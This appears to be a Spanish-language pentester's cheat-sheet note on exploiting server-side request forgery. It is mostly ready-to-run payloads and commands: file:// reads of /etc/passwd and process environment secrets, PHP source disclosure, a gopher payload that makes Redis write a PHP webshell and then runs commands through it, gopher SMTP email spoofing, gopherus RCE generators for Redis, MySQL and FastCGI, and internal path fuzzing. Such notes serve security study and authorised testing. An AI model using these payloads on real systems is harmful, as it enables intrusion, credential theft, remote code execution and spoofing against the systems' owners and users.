---
aliases: null
tags:
  - type/technique
  - vuln/ssrf
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Server-Side Request Forgery (SSRF)]]'
  - '[[SSRF - CWES]]'
  - '[[SSRF - Gopher]]'
  - '[[Anatomía de la Construcción de un Payload Gopher]]'
---
# SSRF - Explotación

***

## Cheatsheet

| **Payload (param value)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `file:///etc/passwd` | Lectura de archivos del backend | Wrapper `file://` habilitado. |
| `file:///C:/Windows/win.ini` | Equivalente Windows | Backend Windows. |
| `file:///proc/self/environ` | Variables de entorno del proceso (DB_PASSWORD/tokens) | Backend Linux con `/proc` accesible. |
| `php://filter/convert.base64-encode/resource=index.php` | Source del backend en base64 | PHP con `allow_url_include` u SSRF que entrega body. |
| `dict://127.0.0.1:11211/stats` | Stats Memcached | libcurl-based backend, Memcached interno. |
| `gopher://127.0.0.1:6379/_INFO%0d%0a` | Output `INFO` de Redis | Schema gopher soportado, Redis sin auth. |
| `gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20%22%5Cn%5Cn%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%3F%3E%5Cn%5Cn%22%0d%0aCONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%2F%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSAVE%0d%0a` | Webshell PHP escrita en `/var/www/html/shell.php` via Redis SAVE | RCE clásico Redis-SSRF. |
| `gopher://127.0.0.1:25/_HELO%20a%0d%0aMAIL%20FROM%3A%3Cattacker@evil%3E%0d%0aRCPT%20TO%3A%3Cvictim@target%3E%0d%0aDATA%0d%0aSubject%3A%20fake%0d%0a%0d%0aPwned%0d%0a.%0d%0a` | Email spoofeado desde loopback | SMTP 25 trust en localhost. |
| `gopher://TARGET:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0d%0aHost%3A%20TARGET%0d%0aContent-Length%3A%2010%0d%0a%0d%0auser%3Dadmin` | Request POST con body controlado | App con SSRF GET-only, target acepta POST. |
| `python2.7 gopherus.py --exploit redis` | URL Gopher generada auto para Redis RCE | Generación rápida sin construir a mano. |
| `python2.7 gopherus.py --exploit mysql --usr root` | Gopher Payload MySQL como root | Backend MySQL trust en localhost. |
| `python2.7 gopherus.py --exploit fastcgi` | Gopher payload FastCGI → RCE | PHP-FPM bindeado a loopback (9000). |
| `ffuf -w paths.txt -u http://TARGET/ -d 'dateserver=http://internal-app/FUZZ&date=2024-01-01' -fr 'Failed to connect'` | Path bruteforce contra app interna | Discovery interna post-port-enum. |
^ssrf-explotacion

### Workflow

```bash
# 1. LFI vía file://
curl -X POST http://TARGET/index.php \
  -d 'dateserver=file:///etc/passwd&date=2024-01-01'

# 2. PHP source disclosure
curl -X POST http://TARGET/index.php \
  -d 'dateserver=php://filter/convert.base64-encode/resource=admin.php&date=2024-01-01' | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d

# 3. Redis RCE via Gopher (con gopherus)
python2.7 gopherus.py --exploit redis
# → input: PHP webshell payload + path /var/www/html/shell.php
# → copy gopher URL output
PAYLOAD='gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aFLUSHALL%0d%0a...'
curl -X POST http://TARGET/index.php \
  --data-urlencode "dateserver=$PAYLOAD" \
  -d 'date=2024-01-01'
curl 'http://TARGET/shell.php?0=id'

# 4. Bruteforce de paths internos
echo -e "admin\nadmin.php\nconfig\nactuator\n.env\nphpinfo.php" > paths.txt
ffuf -w paths.txt \
     -u http://TARGET/index.php \
     -X POST \
     -d 'dateserver=http://127.0.0.1/FUZZ&date=2024-01-01' \
     -fr 'Failed to connect\|404'
```

### Encoding Gopher (gotcha clásico)

Gopher exige **doble URL-encode** cuando el payload pasa por param GET/POST: el server decodifica una vez (HTTP-level) y el backend que abre el socket Gopher decodifica otra vez. Si solo single-encode → CRLF se pierde antes de llegar al socket.

```
Raw (lo que llega al socket):
POST /admin.php HTTP/1.1\r\n
Host: target\r\n
\r\n
user=admin

Single-encoded (NO sirve si pasa por param):
gopher://target:80/_POST%20/admin.php%20HTTP/1.1%0d%0aHost:%20target%0d%0a%0d%0auser=admin

Doble-encoded (sirve):
gopher://target:80/_POST%2520/admin.php%2520HTTP/1.1%250d%250aHost:%2520target%250d%250a%250d%250auser%253Dadmin
```

`gopherus.py` ya genera con encoding correcto para CLI directo; si lo metés en burp/form-data, agregar encode extra.

***
